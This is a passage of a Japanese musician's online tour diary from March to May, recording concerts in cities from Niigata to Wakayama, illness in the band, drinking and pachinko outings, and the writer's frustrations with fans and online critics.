５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">やっと東京に戻ってきた。<BR>

３週間ぶりだよ。洗濯物も溜まりまくってるっちゅうねん。<BR>

俺様のいない間に家で居候している従妹と晩飯を食べに行く。<BR>

ごく普通のOLをしている彼女と話していると、俺様のいる世界はやっぱり特殊なんだと今更ながら気付く。<BR>

俺様からすれば取るに足らないようなことで真剣に悩んでいる。<BR>

彼女に言わせれば俺様の言葉は「冷たい」と言う。<BR>

切り捨ててしまうような言い方が冷たく聞こえるのだろう。<BR>

でも彼女に「本当に必要なものは何だい？」と聞くと答えられない。<BR>

たぶん自分でも答えは見えているのだろう。<BR>

「必要なもの」と「あまり必要じゃないもの」を同レベルで考えている事に気付いているのだろう。<BR>

でもそれは「全部必要だから」という覚悟ではない。<BR>

きっと「切り捨てる勇気」がないだけなんだ。<BR>

俺様なら守るべきもののためなら全てを捨て去るだろう。<BR>

何故なら、失ってから気付くのが嫌だから。<BR>

もう、そんな思いは二度としたくないから。
<HR>
５月和歌山</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日で関西は一段落。<BR>

明日、３週間ぶりに東京に戻る。<BR>

関西に悔いを残さないように燃え尽きるぜ！<BR>

正直、体力的には限界なのだがそこは俺様、そんなことは微塵も感じさせないステージだった。<BR>

でもな、和歌山で初めて俺達を見た人達には大変申し訳無いのだが、今回のライヴに何回か参加したヤツ等が多かったせいか<BR>

なんか馴れ合いを感じた。<BR>

あのな、俺達が毎回違うステージにしようとしてるのに見てる側が同じにしてどうするんだ？<BR>

まあ、最後は感動したけどね（笑）<BR>

常に全力でいこうぜ！<BR>

<BR>

終了後、友人の某Cバンドの連中と大騒ぎ。<BR>

真面目な話５分、くだらない話1時間５５分の楽しい呑みだった。<BR>

また騒ごうぜ。
<HR>
５月奈良</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">奈良入り。<BR>

奈良と言えばシカでシカ？←くだらねえ<BR>

奈良ではシカが一番エライらしいが俺様のほうがエライのだ（笑）
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">久々のOFF。<BR>

天下一品でラーメンを食らい、パチンコに負ける。<BR>

そんな一日だった（笑）
<HR>
５月大阪２日目</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">俺達の圧倒的なパワーを見せつける。<BR>

どうしたんだ、大阪？<BR>

なんか弱いぞ。<BR>

俺様は徐々に盛り上がるのは好きぢゃない。<BR>

だって年に何度も会える俺達ぢゃないんだぞ。<BR>

次にいつ会えるかも分からないんだぞ。<BR>

躊躇している時間がもったいないとは思わないかい？<BR>

いつも全力でいこうぜ！
<HR>
５月大阪１日目</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">メンバーの気合いが凄い。<BR>

さすが大阪だ。<BR>

俺様も負けないぜ！<BR>

本番は楽しかったが、なんか大阪らしくなかったな。<BR>

なんでだろ？<BR>

終了後、濃いミーティング。<BR>

俺様はミーティングが苦手だ。<BR>

その後、スタッフ達と濃い呑み。<BR>

俺様は呑むのは大好きだ（笑）
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">大阪入り。<BR>

京都からの移動中、撮影の仕事。<BR>

ロケだったんだが、俺様はロケが大嫌いだ。
<HR>
５月滋賀</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">さすがに２日連続は辛くなってきた。<BR>

だって、もう“おぢさん”だからね（笑）<BR>

本番は熱かった。<BR>

最初は若干、躊躇してたみたいだけどすぐに大盛り上がり。<BR>

俺達が一緒に過ごせる時間は短いんだから躊躇してる暇があったら盛り上がろうぜ！<BR>

<BR>

「ヒマワリ」はモノじゃない。<BR>

お前達の笑顔のことだ。<BR>

モノにこだわるな。
<HR>
５月京都</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">久しぶりに狭いステージだ。<BR>

客席は広いんだがステージが極端に狭い。しかも暑い。<BR>

しかしこんなことで負ける俺様ぢゃねえぜ。<BR>

いざ、本番。<BR>

楽しかった。このノリはライヴハウスに近かったかな。<BR>

終了後、イベンターYさんと呑む。<BR>

久々に一緒に呑んだが楽しかった。<BR>

やっぱり楽しく呑まないとな。
<HR>
５月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">京都入り。<BR>

パチンコでしっかり負け、ふてくされて呑みに行く。<BR>

歩いていると前から歩いてきた女のコが「あれ？俺様！」と言いながらポンと肩を叩いてきた。<BR>

あまりの馴れ馴れしさに「もしかして知り合いか？」と思ったがまったく知らない顔だ。<BR>

どうやらファンのコらしい。<BR>

その馴れ馴れしさに腹が立ち、無視して通りすぎると「ヤクザみたい」と言われた。<BR>

なんやそれ、このクソガギ！<BR>

近く感じてくれるのは構わないが、友達じゃねえ。<BR>

あったこともないガキに馴れ馴れしい口をきかれる筋合いもねえ。<BR>

俺達っていうのはこんな屈辱にも耐えなければならないのか？<BR>

俺はそんなことのためにやってるわけじゃねえんだよ。<BR>

あ〜ムカツクぜ！
<HR>
５月鳥取</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">若い。若いがゆえに盛り上がったって感じ。<BR>

盛り上がるのは良いんだが、その盛り上がり方はどうかな？<BR>

本当に聴いてくれてるのかな？<BR>

なんて事を考えたときもあった。<BR>

ま、それもライヴだな。
<HR>
５月島根<BR>

熱いね。K・Mの生まれ故郷だけに俺達にも力が入る。<BR>

イグアナ・パワーか？（笑）
<HR>
島根入り。<BR>

今日は島根でオクダタミオさんのライヴがあるというので見に行く。<BR>

良かった。ネコカルを見たときと同じ空気を感じた。<BR>

俺も将来、あんなステージをやってみたい。<BR>

<BR>

その後、スタッフ達と居酒屋で呑み。<BR>

その居酒屋のメニューに気になる名前があった。<BR>

「イグアナのお酒」…なんすか、それ？（笑）<BR>

飯も一通り食べたし、焼酎も一升空けたしシャレで注文。<BR>

もちろん呑むのは若い衆だ（笑）<BR>

やって来たのはまさにイグアナ。<BR>

本物のイグアナが焼酎にどっぷり浸かっているのだ。<BR>

見た目のインパクトも凄いが味も凄い。<BR>

俺様も一口呑んだが、変に油っこいのよ。<BR>

店員さんに聞いたところ、イグアナも食べられるというので早速若い衆が挑戦。<BR>

いや〜若いって素晴らしい（笑）<BR>

でも口からシッポや足をペロペロ出すのはやめてくれ。<BR>

思い出すだけで気持ち悪い。<BR>

その後、シメにラーメンを食べてお開き。<BR>

あ〜面白かった。
<HR>
５月神戸</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">メンバーのパワーが凄い。<BR>

地元なだけに力が入っているのだろう。<BR>

俺様も負けずにノリノリ。<BR>

関西特有のツッコミもあり、アットホームなライヴだった。<BR>

終了後、ゲロウマの牛舌を食べ一度ホテルへ帰還。<BR>

スタッフが近くで飲んでいるというので合流。<BR>

今日はたくさん喋ったな。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">神戸入り。<BR>

神戸行きの新幹線のホームで正月にお世話になったヤマダさんに会う。<BR>

全くの偶然にお互い驚いた。<BR>

ヤマダさん、今度ぜひ呑みましょう。<BR>

<BR>

神戸到着。さっそくパチンコへ出かけるが、惨敗。<BR>

久しぶりの大負けだ。<BR>

中途半端な時間なのでとりあえず呑むことにした（笑）<BR>

4人で大騒ぎ。<BR>

酒にも飽きたので久しぶりにビリヤード。<BR>

それも３０分くらいで飽きたので再び呑み屋へ（笑）<BR>

そこで呑みまくり早めにホテルへ。<BR>

おお、まだ1時だぜ。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">昨日はほとんど呑まなかったので体が軽い。<BR>

おぉ、呑まないとこんなに楽なのか。<BR>

これからは酒をひかえよう。←大嘘（笑）<BR>

リハはバッチリ、良い音だ。本番は期待できそうだ。<BR>

…ところが、本番中に機材に異常が出る。<BR>

しかも、他にもトラブルが続出（泣）<BR>

その度に開き直ってがむばる。<BR>

おかげでいつもとは違ったステージができた。<BR>

こういうのもたまには面白いもんだな。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">昼過ぎに起床。<BR>

どうしてもラーメンが食べたくなって街へ繰り出す。<BR>

何気に入った店がゲロウマ。<BR>

こういうお店を探していたんだよ！って感じだ。<BR>

「異人館」って店だ。オススメだ。<BR>

食後、そのままパチンコへ。<BR>

ここで見つけたスロット（裏モノ）が大爆発！<BR>

２時間ほどで３０００枚を叩き出し、ホテルへ戻る。<BR>

今日は手羽先でも食べて早めに寝よう。
<HR>
４月名古屋２日目</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">昨日の酒が抜けきってない。<BR>

リハで目を覚まそう。<BR>

気合を入れなおして、いざ本番！<BR>

めちゃくちゃ良かった。<BR>

“楽しい”という気持ちに“嬉しい”が上乗せされて最高に気持ち良かった。<BR>

また前に進んだ気がする。</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">終了後、すごく会いたかったヤツに会えた。<BR>

もう会えないと思っていた。<BR>

いつもいつも想っていた。<BR>

嬉しさと悲しさを同時に感じた。<BR>

ごめん、俺もっともっと強くなるよ。
<HR>
４月名古屋１日目</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">地元を意識しないようにしたつもりだが、すっげー緊張した。<BR>

リハから落ち着きがなかった。<BR>

あの落ち着きのなさはまるで動物園の熊のようだったろう（笑）<BR>

ライヴはゴキゲンだった。<BR>

ただ一つ残念なのは、やはりライヴを撮影会と勘違いしている奴等が多かったことだ。<BR>

「キャー！」って言いながらシャッターを押してるんだよね。<BR>

あれで楽しいのかな？<BR>

終了後、昔からの友人達と呑む。<BR>

その中の一人が彼女を連れてきていて、俺様の前で婚約したのだ。<BR>

そのときの彼女の嬉しそうな顔が忘れられない。<BR>

よし！明日のライヴはお前ら二人を想ってやるぜ！
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">俺様がずっとお世話になっていたバイト先に挨拶に行く。<BR>

久しぶりにみんなと会えて嬉しかった。<BR>

夜、スタッフ達と激呑み。<BR>

最近、酒の量が多すぎなんぢゃないか？（笑）
<HR>
４月三重</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">「これもライヴだよな」って感じ。<BR>

まるで記者会見のようなフラッシュも音響のトラブルも…。<BR>

そのくらいは楽しんで切りぬけるくらいの経験は積んでいる。<BR>

でもな、ライヴに何しに来てんだ？って奴が多すぎた。<BR>

客席に近づくと足を掴まれる。足を叩かれる。<BR>

俺のベースを触る、スイッチをいじる。<BR>

俺の手を掴む、手を叩く。<BR>

しかも遠くの席から走ってきて。<BR>

まともに演奏が出来やしない。<BR>

それでも気持ちを切り替えて楽しもうと思ってやった。<BR>

でもやたらと光るんだよな、客席が。<BR>

なんだかなあ…。<BR>

<BR>

終了後、地元の友達と激呑み。<BR>

気がつけば朝でした（笑）
<HR>
某サイトで書かれていたんだが、俺達の曲は単純で簡単で奥深くないそうだ。<BR>

そしてギター、ベース、ドラムが簡単なんだと。<BR>

でも、そう思った理由が笑える。<BR>

「バンドスコアを見ると初心者でも一日でコピーできる」<BR>

あのな、バンドスコアだぞ？<BR>

あれは初心者が見るんだから初心者用に簡単に書いてあるに決まってるだろうが。<BR>

フレーズも簡略、もしくは省略してあるし、運指を簡単にするためフレット移動も極力減らしてある。<BR>

ニュアンスの部分は表記すること自体が難しいしね。<BR>

だからスコア通りに演奏しても“似たもの”にしかならないのよ。<BR>

それなりに弾ける奴はそんなの見ないからね。<BR>

よく“メンバー監修”とかでやたらと難しく書いてあるヤツがあるが、<BR>

あんなの初心者が見たらやる気がなくなるっちゅうねん。<BR>

俺もなくす、だって耳コピしたほうが早いんだもん（笑）<BR>

もしちゃんと聴いて「簡単ぢゃん」と思ったならそれはそれで結構。<BR>

別に俺達の曲は難解なことを目的にはしていないからね。<BR>

シンプルな曲も当然あるし。<BR>

でも難しい事って何なんだろう？<BR>

チョッパーでもやればいいのか？ちなみに出来るぞ。<BR>

指弾きもピック弾きもやるし、なんだったらドラムスティックでも弾く（叩く？）ぞ。<BR>

ボサノバやブレイク・ビーツ、シャッフルからレゲエまで何でも取り入れてるぞ。<BR>

（あくまで“取り入れてる”だけね）<BR>

必要なテクニックは使うが必要なければ無理に使う必要はない。<BR>

個人的には練習してるけどね。だって出来ないからやらないのはカッコ悪いぢゃん。<BR>

それと俺達は完全セルフ・プロデュースだ。<BR>

有名なプロデューサーが作った曲や凄いテクニシャン達の音楽だけが良い音楽だと思うならそれはそれでいいんぢゃない？<BR>

俺達は自分達の足で自分達のペースで自分達の音を探してるだけなんだから。<BR>

イマドキいないぜ。作詞、作曲、演奏まで完全に自分達だけでやってるバンド。<BR>

でも音楽理論でいくと結構面倒なことやってるんだぜ。<BR>

９thや１３th（もしくはそれ以上）使ってたり、転調しまくってる曲も多いんだぜ。わざと不協和音を混ぜたりとか。<BR>

まあ、そんなことは聴くほうには関係ないから良いんだけどね。<BR>

長々と書いちゃったな、そんなつもりは無かったんだが（笑）<BR>

俺達の音楽が嫌いならそれでいいぢゃん。<BR>

別に俺は何とも思わないよ。<BR>

でもそれにもっともらしい理由をつけて人前でアピールするのはどうかと思うぞ。<BR>

それがどうしても言いたかっただけなんだけどね。<BR>

まあ、俺様の日記だからいいか？（笑）<BR>

<BR>

</FONT><FONT SIZE="-1"
COLOR="#AF0000">これについての書込みは禁止</FONT><FONT
SIZE="-1">するぞ。<BR>

あと、このことの発端になった人を見つけても</FONT><FONT SIZE="-1"
COLOR="#AF0000">絶対に攻撃しないように</FONT><FONT SIZE="-1">。<BR>

つまらない水掛け論だけはするなよ。
<HR>
４月静岡</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">５日ぶりのライヴ。<BR>

たった５日なのに体が明らかに鈍っている。<BR>

リハを長めにやって感覚を取り戻す。<BR>

そしていざ本番！<BR>

リラックスした良い雰囲気のライヴだった。<BR>

明日もがむばるぞ！<BR>

<BR>

最近「ユニ○ロ」って流行ってるのね。<BR>

俺様がガキの頃は「ユニ○ロ」で買い物をしてるとバカにされたんだが…。<BR>

でも俺様は買ってたけどね。<BR>

だって安いんだもん、質は良くなかったけど（笑）<BR>

だってTシャツ一枚が５００円なんだぜ、一回洗うとのびのびになったけど（笑）<BR>

時代は変わるもんだ。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">ネコさんと打ち合わせを兼ねた呑み。<BR>

ちょいとした企みがあるのだ。うひひ（笑）<BR>

待ち合わせの時間よりも早く到着したため時間つぶしにパチンコ。<BR>

…のはずが激当たり。<BR>

しかも連チャンしまくり。待ち合わせの時間をオーバーしても止まらない。<BR>

ようやく連チャン終了。<BR>

結局、１５分くらい遅刻して合流。<BR>

お気に入りの店でくつろぎながら打ち合わせ。<BR>

と言っても普通に呑んでるだけなんだけどね（笑）<BR>

途中からライターM女史も合流し盛り上がる。<BR>

明日の本番にそなえて一足先に失礼した。<BR>

ネコさん、後はよろしくです。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">横顔を思い浮かべられるヤツはいるかい？<BR>

正面じゃなくて横顔だ。<BR>

そいつ表情まで思い浮かべられるかい？<BR>

そいつは今、どんな顔してる？<BR>

<BR>

それが“人を想う”ってことだ。<BR>

愛だの恋だの、そんな使い方も意味もよくワカラねえ言葉じゃなくてさ。<BR>

憎しみも怒りも違うカタチの同じ“想い”だ。<BR>

<BR>

ちょっと難しかったかな？（笑）
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">今日は最近仲良くなった某SFGバンドのメンバーと呑み会。<BR>

その前にちょいとパチンコ。<BR>

初めて見る新台にコテンパンにやられる。<BR>

ちくしょ〜！<BR>

その後、合流して焼肉屋へ。<BR>

う〜ん、若いってのは良いね。<BR>

食いっぷりが実に気持ち良い←おっさんくさい（笑）<BR>

呑み足りないので二件目に居酒屋へ。<BR>

焼酎のボトルを空けて解散。<BR>

いろんな話で盛り上がった楽しい呑み会だった。<BR>

みんな、また呑もうね。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日は昼からリハ。<BR>

練習しないと体がなまるからな。<BR>

でも２時間くらいでやめ（笑）<BR>

やっぱライヴだぜ！<BR>

夜、ネコさんと某B−BバンドのYと呑む。<BR>

異色の顔合わせだが、これが意外な盛り上がりを見せた。<BR>

ネコさん、ご馳走様でした。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">早起きしてしまい暇なのでNEW
PCをいじる。<BR>

いろいろな設定を完了したのだが、どうもNETの接続が上手く行かない。<BR>

なんでだろ？<BR>

腹も減ったので昼飯。<BR>

おなじみのラーメン屋へ行く。<BR>

ここのラーメンは安心できる味だな。<BR>

その後、腹ごなしにパチンコ。ここで久々の大勝利！！<BR>

ゴキゲンで家に帰る。<BR>

夜、友人のバンドが曲作りを兼ねたリハをやっているというので遊びに行く。<BR>

真面目にやっていたので邪魔しちゃ悪いなと思いつつ遅くまで邪魔しちゃった（笑）<BR>

みんなゴメンね。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">１０日ぶりに東京にもどる。<BR>

俺様は仕事があるのでそのまま事務所へ。<BR>

楽しく仕事を終え、タクシーで家に向かう。<BR>

洗濯物もたまってるし（笑）<BR>

久しぶりに昼間の東京を見たのだが、一つ驚いたことがある。<BR>

何なんだ、あのGジャンは？<BR>

みんな同じカッコウしている。<BR>

あまりにも多いから学校の制服かと思ったよ（苦笑）<BR>

人と違うことをアピールするのもダサいが、人と同じ事に満足を覚えるのもダサいぜ。
<HR>
４月長野</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">北陸最終日。<BR>

気合も充実している。<BR>

いざ本番！<BR>

前半、興奮しすぎの部分もあったが楽しかった。<BR>

Y・A以外の全員がステージから飛び降りるという荒業もやってのけた（笑）<BR>

終了後、焼肉屋で盛り上がる。<BR>

K・Mの下ネタは相変わらず下品だな（笑）<BR>

その後、俺様単独でスタッフと合流し“お約束”の白木屋で朝までGO!<BR>

楽しかったぜ、北陸。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">長野入り。<BR>

途中、豚汁の美味い店に立ち寄る。<BR>

ここは相変わらず美味い。<BR>

量が多すぎなのは難点だがな（笑）<BR>

ホテルに到着、雨の中さっそくパチンコへ。<BR>

初めてやるスロットでゴキゲンな連チャンをキメ、本日の呑み代ゲット！<BR>

F＋Cが長野にいるという情報をキャッチし、GtのSに電話。<BR>

居酒屋で合流し朝まで大騒ぎ。<BR>

楽しい飲み会だった。
<HR>
４月富山</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">男のコの数が凄く増えてる。<BR>

今までで一番多かったんぢゃないか？<BR>

やっぱ男の太い声が聞こえるのは嬉しい。<BR>

でも基本的に男はシャイだから盛り上がるまでが大変だ。<BR>

もっと最初から盛り上がっていこうぜ！<BR>

女のコも負けるなよ。<BR>

俺達は絶対負けないけどね（笑）
<HR>
４月金沢</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">ROCKなライヴだった。<BR>

俺的にライヴの内容には満足しているが、一部の客が気になった。<BR>

声援は有難いのだが、やりすぎだ。<BR>

ほとんどヤジと変わらない。<BR>

もう少し考えてくれ。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">昼に金沢入り、早速パチンコへ。<BR>

まずCRを打つ、こいつがボロ負け。<BR>

しかも打ってて全然面白くない。<BR>

この時点で２万円の負け。<BR>

イカン、このままぢゃ今日の呑み代がなくなる。<BR>

俺様ピ〜ンチ！<BR>

しかし、裏モノのスロットを発見しイチかバチかの大勝負。<BR>

こいつが出るんだ。<BR>

結局コイン２０００枚をゲットし、１万５千円のプラス。<BR>

さあ、呑むぞ！！
<HR>
４月福井</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">男性FAN“ヒデト君”から頂いたファイヤーサンダルを履いてリハ。<BR>

リハから燃えていくぜ！<BR>

本番、M・Mの声は予想以上に出ている。<BR>

俺様も嬉しくなって大暴れ。<BR>

すっげー楽しかった。<BR>

本番終了後、みんなで温泉に入った。<BR>

男同士裸の付き合いだ。<BR>

その後、呑みまくる。<BR>

ちょいとしたトラブルもあったが、最後はゴキゲンで終了。<BR>

明日はパチンコだな。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">節酒二日目。<BR>

つまんねぇな。
<HR>
朝、俺はみんなと顔を合わせると最初に言う言葉がある。<BR>

「どう？」<BR>

みんなは必ず「大丈夫だよ」と言う。<BR>

声を出せないM・Mは手で「OK」とサインを出す。<BR>

みんなも俺に聞いてくる<BR>

「どう？」<BR>

俺も必ず「大丈夫だよん」と返す。<BR>

もう大丈夫じゃないのはお互いを見ればわかる。<BR>

でも、本当に大丈夫かどうかは本人が決めるしかないのだ。<BR>

「声が一生出なくなるかもしれない」という恐怖をかかえながらも<BR>

歌うかどうかは本人の意思しかない。<BR>

俺も倒れるかもしれない、みんなに迷惑をかけるかもしれない。<BR>

でもな本人が「やる」といった以上、俺達は「だったら中途半端はやめようぜ」<BR>

と言うしかないんだ。<BR>

心配とは“心を配る”と書く。<BR>

言葉じゃなくて“心”なのだ。<BR>

本当に心配ならもっともっと笑顔を見せてくれ…。
<HR>
４月松本</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">朝、咳が止まらず死にかける。<BR>

だって１分以上も咳が出続けるから呼吸が出来ないんだもん。<BR>

なんとか乗り切ってもう一眠り。<BR>

目が覚めると今度は胃が痛くて起きれない。<BR>

って言うか、あまりの痛さに動くことすらできない。<BR>

ということで急遽病院へ。<BR>

診察の結果、ウィルス性の炎症ということだった。<BR>

筋肉注射のあと、薬をもらい会場へ。<BR>

鎮痛剤のおかげで手に力が全く入らない。<BR>

しかも強力に眠い。<BR>

なんとかリハをやるがM・Mの声もまだダメだし、俺様もかろうじて弾けるくらいだ。<BR>

今日の本番はどうなることやら…。<BR>

<BR>

本番は俺達の底力を見せつけた。<BR>

ふふんだ、こんな事くらいじゃ俺達は負けねえんだよ。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">松本入り。<BR>

東京に一人戻ったM・Mが心配だ。<BR>

俺様はベース・クラフトマンと一緒に呑みながらNEW
BASSの打ち合わせ。<BR>

このモデルが完成すれば今よりもさらに上が見えるハズ。<BR>

明日のライヴが無事出来ますように…。
<HR>
４月浜松</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">恐れていたことが現実になった。<BR>

結果的にライヴは良かったのだが、この“良かった”は何度もやるものじゃない。<BR>

俺は一日も早く善くなってくれるのを祈るしかない。<BR>

それにしてもムカツクのは“無責任”な「頑張って！」の一言だ。<BR>

こっちはいつでも頑張ってるんだよ！<BR>

さらに酷いのは「もっと歌って！」だ。<BR>

バカじゃないのか？頑張って歌い続けた結果がわからないのか？<BR>

本当に“頑張った”ことのないヤツはこれだから嫌いだ。<BR>

<BR>

ここで俺様から一つお願いがある。<BR>

M・Mのことが本当に心配ならそっとしておいてくれ。<BR>

「大丈夫ですか？」なんてバカな質問をするな。<BR>

それと近づいてくるな！<BR>

声が出なくなったヴォーカリストの気持ちを考えてみろ。<BR>

あいつが「どうしてもやりたい」って言わなければ本当はライヴを延期させたいくらいなんだ。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">某B-Bバンドのライヴを見に渋谷へ。<BR>

今日は２nd effectのみんなも一緒だ。<BR>

ライヴはグッと良くなっていた。<BR>

ツアーの成果が早くも見られた。<BR>

終了後、若手バンドのみんなを引き連れて食事会。<BR>

いや〜、若者はよく食うね。<BR>

俺様の財布はスッカラカンだよ（笑）<BR>

その後、俺様も奢ってもらうため、事務所の社長に電話。<BR>

B-Bバンドの打ち上げに合流。<BR>

社長と久々の長話。<BR>

今日はいろいろ楽しい一日だったな。
<HR>
４月千葉</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">みんなのパワーが凄かった。<BR>

俺達の予想以上のパワーを見せつけられた。<BR>

それはそれで非常に良いのだが、パワーはぶつけるだけぢゃダメだぞ。<BR>

受け入れる事も大事なのだ。<BR>

それが出来ないと一方通行になるからな。<BR>

でも面白かったよ。
<HR>
新潟初日の日記を見た一部の人達から案の定、批判メールが来た。<BR>

「そんな事書かれて悔しい」「その日しか見れない人も居るんだから」<BR>

来ることは予想していた。<BR>

過去にも何通もきているしね。<BR>

でもな、よく考えてみてくれ。<BR>

俺は「ライヴの内容がダメだった」とは書いていない。<BR>

むしろ、いつもよりも“気”を出していたので他では見られない内容だったと思う。<BR>

（ちなみに、この日の夜M・Mは声が枯れ、翌日病院へ行っている。）<BR>

ライヴをエンターテイメントとして考えれば、あの日のライヴは充分良い出来なのだ。<BR>

ただ、俺達はそういうライヴで終わりたくないだけなんだ。<BR>

日ごとにパワーアップしていくライヴ。<BR>

毎日同じ事をやっても満足しない。<BR>

言いかえれば、戸田や、神奈川でやったライヴを今やっても満足しないだろう。<BR>

あの日の俺達には最高だったが今の俺達には普通なのだ。<BR>

何本もあるライヴだが、俺達は毎日が初日であり最終日だと思っている。<BR>

明日のことなんて考えていない。<BR>

なぜなら今日のライヴがなければ明日に繋がらないから。<BR>

一瞬で消える今を繰り返して明日になる。<BR>

少しでも前に進みたいだけなんだよ。<BR>

俺はせっかく日記を書いているんだから今の正直な気持ちを書いておきたい。<BR>

「みんなが見る日記だからそんなこと書かないで」<BR>

という意見もあるだろう。それなら俺の返事はこうだ。<BR>

「だったら見に来るな。誰も頼んでねえんだからよ。」<BR>

俺は表で良い顔して裏で舌を出すような人間にはなりたくないんでな。
<HR>
４月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">この所ずっと体調が良くなかったんだが、ついに病院のお世話になった。<BR>

この俺様としたことが……俺様不覚（笑）<BR>

俺様は大の病院嫌いなのだ。<BR>

風邪で熱が４０度出ようが、ぶっ倒れようが病院には行かなかった。<BR>

それくらいの病院嫌いなのに今回はついに足を運んでしまった。<BR>

何でかっちうと咳が止まらないのだ。<BR>

熱とかはないんだが、咳が連発して呼吸もままならなくなったのだ。<BR>

しかも咳の連発中にくしゃみが出て自分でも何がなんだかわからなくなったりして（笑）<BR>

これではライヴに支障が出そうなので観念して病院に行ってきた。<BR>

軽い気管支炎らしいのだが、まだわからん。<BR>

薬も貰ったからもう大丈夫だろう。<BR>

俺様は病気なんかには屈しないのだよ。わははは。
<HR>
４月新潟二日目</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">昨日は早めに寝たから酒は残っていない。<BR>

元気モリモリだ（笑）<BR>

今日は昨日みたいなことにならないように祈っていざ本番！<BR>

これなんだよな。これがやりたいんだよ。<BR>

そういうライヴだった。<BR>

俺達の出した“気”をみんなが受け止めて、みんなが出した“気”を俺達が受け止める。<BR>

この繰り返しが俺達のライヴなんだな。<BR>

<BR>

ゴキゲンで次のライヴ会場に移る。<BR>

俺様は今日ライヴ二本立てなのだ（笑）<BR>

DTバンドのライヴに飛び入り。<BR>

しかも俺様はステージ衣装のまま！<BR>

本番前にみんなで写真を撮ったんだが、おおっ！DTバンドに自然に溶け込んでいる！<BR>

さすがDTバンド東京支部ベーシストだけあるな（笑）<BR>

俺様が参加することでDTバンドはスーパーDTになるのだ。<BR>

たった二曲だがスーパーなライヴを超スピードで見せて俺様脱出！<BR>

その後打ち上げ。<BR>

ゴキゲンなライヴを一日に二回もやってしまった俺様はゴキゲンにみんなにからむ（笑）<BR>

前回はDr・Hにからまれっぱなしだったが、今回は俺様も負けじとからむ。<BR>

でも、めちゃめちゃ面白かった。<BR>

また遊ぼうね。<BR>

<BR>

犬神サーカス団のみなさん、CD有難うございました。<BR>

２nd effectのみんな、また遊ぼうね。
<HR>
４月新潟</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">午前中の新幹線に乗り、新潟入り。<BR>

やっぱ、地方に来るとツアーって感じがグッと出るよな。<BR>

久々に二日酔いぢゃないし（笑）<BR>

順調にリハをやり、いざ本番！<BR>

…なんか変だった。<BR>

俺達が全身から“気”を出しても吸い取られるだけというか、流されるというか…？<BR>

何も帰ってこないのだ。<BR>

“見られているだけ”という感じがして仕方が無い。<BR>

もちろん、見ている人達のせいにする気はさらさらないんだが…。<BR>

俺達はどんなときでも“手を抜く”なんてことはしない。<BR>

いつも全力だ。<BR>

でも、M・Mが声を枯らして叫んでも、俺達がぶっ倒れるまで演奏しても充実感が圧倒的に足りない。<BR>

こういう日が一番タチが悪い。<BR>

原因がわからないんだから。<BR>

ライヴ後のみんなの苦笑いが忘れられない。<BR>

みんな俺と同じ気持ちだったのだろう。<BR>

楽屋で何気なく「がんばろう」って言ったのは本心だ。<BR>

<BR>

終了後、観に来てくれたDTバンドのみんなと飯。<BR>

食生活が一番寂しいであろうDr・Hのためにごちそうする。<BR>

刺身の盛り合わせを食べたVo・I君の一言<BR>

「俺、刺身なんて半年ぶりだよ！」<BR>

明日のライヴがんばってね。<BR>

俺も飛び入りするけど（笑）
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">昨日はたくさん呑んだな。<BR>

昼に一度目が覚めて「俺様！」を更新して二度寝。<BR>

夕方に目が覚め、ISDNの設定に再挑戦。<BR>

結局上手くいかず、ムカついていると従妹が突然の上京。<BR>

今日からしばらく家に居候するのだ。<BR>

実は前々から聞いていたので突然ぢゃなかったのだが…忘れてた（笑）<BR>

そのためネコさんとの約束を守れなかった。<BR>

ごめんなさいネコさん。<BR>

俺様は約束を簡単に反故にするようなマネは大嫌いなのだが、やってしまいました。<BR>

“簡単”なつもりはないですが…。←言い訳がましいですね、反省。<BR>

<BR>

これを書きながらネコカルのCDを聴いている。<BR>

いろんな事を考えている。<BR>

いや、考えてしまう。<BR>

